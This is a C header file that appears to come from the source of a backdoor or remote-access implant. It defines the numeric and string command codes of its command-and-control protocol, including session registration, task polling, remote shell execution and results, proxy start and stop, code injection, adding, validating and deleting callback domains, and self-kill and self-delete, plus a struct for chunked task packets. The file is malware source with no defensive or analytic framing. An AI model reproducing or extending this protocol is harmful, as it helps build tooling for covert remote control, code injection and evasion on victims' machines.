#pragma once


#define MacroRegisterCode  "01"
#define MacroRegisterRemaingCode  "02"
#define MacroResultCode  "03"
#define MacroAskTaskCode  "04"

#define MacroShellCode  "06"
#define MacroShellResultCode  "07"
#define MacroShellResultRemaingCode  "08"
#define MacroInternetTest  "09"
#define MacroInternetTestResult  "10"
#define MacroInternetTestResultRemaing  "11"

#define MacroStartProxy  "12"
#define MacroStartProxyResult  "13"
#define MacroStopProxy  "14"
#define MacroStopProxyResult  "15"
#define MacroTaskBufferDoneCode  "f0f0:f0f0:f0f0:f0f0:f0f0:f0f0:f0f0:f0f0"
#define MacroTaskNotFoundCode  "f1f1:f1f1:f1f1:f1f1:f1f1:f1f1:f1f1:f1f1"
#define MacroNoTaskCode  "ff"
#define MacroDataEnd  "99"


#define SessionIDSize 4 
#define SessionIDHexSize 3*2



#define NoTaskCode 32
#define ChangeSleepCodeTA 5
#define MacroChangeSleepStrAT  "05"
#define MacroShellResultCodeAT  "07"
#define MacroShellResultRemaingCodeAT "08"


#define MacroShellCodeTA  6
#define MacroShellStrAT "06"

#define MacroStartProxyStrAT  "12"
#define MacroStartProxyCodeTA  12

#define MacroStopProxyStrAT  "14"
#define MacroStopProxyCodeTA  14

#define MacroInjectStrAT  "17"
#define MacroInjectCodeTA  17

#define MacroNewCallBackDomainStrAT  "18"
#define MacroNewCallBackDomainCodeTA  18

#define MacroValidateCallBackDomainStrAT "19"
#define MacroValidateCallBackDomainStrTA  19

#define MacroDeleteCallBackDomainStrAT  "20"
#define MacroDeleteCallBackDomainCodeTA  20

#define MacroValidateDeleteCallBackDomainStrAT  "21"
#define MacroValidateDeleteCallBackDomainStrTA  21

#define MacroListAllActiveDomainsStrAT  "22"
#define MacroListAllActiveDomainsStrTA  22


#define MacroSelfKillAT  "16"
#define MacroSelfKillTA 16

#define MacroSelfDelAT  "15"
#define MacroSelfDelTA 15

typedef struct TasksPacket
{
    char *TaskBuffer;
    int Size;
    int Remaing;
    int TaskType;
    int IsLastPart;
} TasksPacket;